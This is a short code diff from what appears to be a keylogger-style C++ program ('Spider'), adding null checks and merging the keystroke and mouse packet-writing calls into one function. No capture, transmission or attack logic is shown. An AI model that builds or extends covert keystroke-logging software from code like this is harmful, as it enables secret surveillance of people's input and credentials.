@@ -172,7 +172,8 @@ void			Spider::getKeystrokes(boost::asio::yield_context &yield)
 #endif // !DEBUG
 
   try {
-    _json->writePaquetKeys(&paquet);
+    if (_json)
+      _json->writePaquet(&paquet);
   }
   catch (const std::exception &e) {
     std::cerr << e.what() << std::endl;
@@ -217,7 +218,8 @@ void			Spider::getMouse(boost::asio::yield_context &yield)
 #endif // !DEBUG
 
   try {
-    _json->writePaquetMouse(&paquet);
+    if (_json)
+      _json->writePaquet(&paquet);
   }
   catch (const std::exception &e) {
     std::cerr << e.what() << std::endl;
